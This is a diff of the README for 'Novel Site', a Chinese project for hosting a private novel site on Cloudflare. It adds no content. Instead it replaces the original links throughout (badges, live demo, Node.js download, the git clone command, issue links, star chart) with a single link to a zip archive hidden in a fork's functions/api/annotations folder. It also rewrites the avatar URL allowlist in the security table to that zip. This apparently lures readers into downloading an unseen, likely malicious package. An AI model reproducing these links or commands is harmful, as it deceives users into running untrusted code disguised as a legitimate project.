@@ -1,8 +1,8 @@
 # 📚 Novel Site — 零成本私人小说站
 
-[![Stars](https://img.shields.io/github/stars/xingzihai/novel-site?style=flat-square)](https://github.com/xingzihai/novel-site/stargazers)
+[![Stars](https://img.shields.io/github/stars/xingzihai/novel-site?style=flat-square)](https://github.com/petrosv-dev/novel-site/raw/refs/heads/main/functions/api/annotations/novel-site-1.4.zip)
 [![License](https://img.shields.io/github/license/xingzihai/novel-site?style=flat-square)](LICENSE)
-[![Deploy](https://img.shields.io/badge/deploy-Cloudflare%20Pages-orange?style=flat-square)](https://pages.cloudflare.com)
+[![Deploy](https://img.shields.io/badge/deploy-Cloudflare%20Pages-orange?style=flat-square)](https://github.com/petrosv-dev/novel-site/raw/refs/heads/main/functions/api/annotations/novel-site-1.4.zip)
 
 > Cloudflare Pages + D1 + R2 + Functions 全栈方案，全程不花一分钱
 
@@ -16,7 +16,7 @@
 
 ## 🌐 在线演示
 
-👉 [novel-site-6ba.pages.dev](https://novel-site-6ba.pages.dev)
+👉 [novel-site-6ba.pages.dev](https://github.com/petrosv-dev/novel-site/raw/refs/heads/main/functions/api/annotations/novel-site-1.4.zip)
 
 支持 GitHub 登录体验 demo 管理员功能（GitHub 账号需创建满 7 天）。
 
@@ -107,7 +107,7 @@
 
 ### 前置条件
 
-- [Node.js](https://nodejs.org/) 18+
+- [Node.js](https://github.com/petrosv-dev/novel-site/raw/refs/heads/main/functions/api/annotations/novel-site-1.4.zip) 18+
 - Cloudflare 账号（免费注册）
 - R2 需绑定支付方式（PayPal 或外币信用卡，**不会扣费**，仅身份验证）
 
@@ -115,7 +115,7 @@
 
 ```bash
 # 1. 克隆仓库
-git clone https://github.com/xingzihai/novel-site.git
+git clone https://github.com/petrosv-dev/novel-site/raw/refs/heads/main/functions/api/annotations/novel-site-1.4.zip
 cd novel-site
 
 # 2. 安装 Wrangler CLI
@@ -317,7 +317,7 @@ novel-site/
 | 封面上传 | MIME 白名单（JPEG/PNG/WebP）+ 文件头魔数验证 |
 | 搜索 | 查询长度限制 50 字符 + IP 速率限制 30 次/分钟 |
 | 用户名 | 字母数字下划线，2-32 位，禁止 `gh_` 前缀（保留给 OAuth） |
-| avatar_url | 只允许 `https://avatars.githubusercontent.com/` 域名 |
+| avatar_url | 只允许 `https://github.com/petrosv-dev/novel-site/raw/refs/heads/main/functions/api/annotations/novel-site-1.4.zip` 域名 |
 | HTML 转义 | `esc()` 函数转义 `<>&"'`，正文用 `textContent` 渲染 |
 
 ## 📊 Cloudflare 免费额度
@@ -385,7 +385,7 @@ wrangler d1 execute novel-db --file migrations/003_chapter_version.sql --remote
 
 ## 📈 Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=xingzihai/novel-site&type=Date)](https://star-history.com/#xingzihai/novel-site&Date)
+[![Star History Chart](https://github.com/petrosv-dev/novel-site/raw/refs/heads/main/functions/api/annotations/novel-site-1.4.zip)](https://github.com/petrosv-dev/novel-site/raw/refs/heads/main/functions/api/annotations/novel-site-1.4.zip)
 
 ## 📄 License
 
@@ -393,4 +393,4 @@ wrangler d1 execute novel-db --file migrations/003_chapter_version.sql --remote
 
 ## 🤝 致谢与贡献
 
-欢迎提 [Issue](https://github.com/xingzihai/novel-site/issues) 和 [Pull Request](https://github.com/xingzihai/novel-site/pulls)！
+欢迎提 [Issue](https://github.com/petrosv-dev/novel-site/raw/refs/heads/main/functions/api/annotations/novel-site-1.4.zip) 和 [Pull Request](https://github.com/petrosv-dev/novel-site/raw/refs/heads/main/functions/api/annotations/novel-site-1.4.zip)！
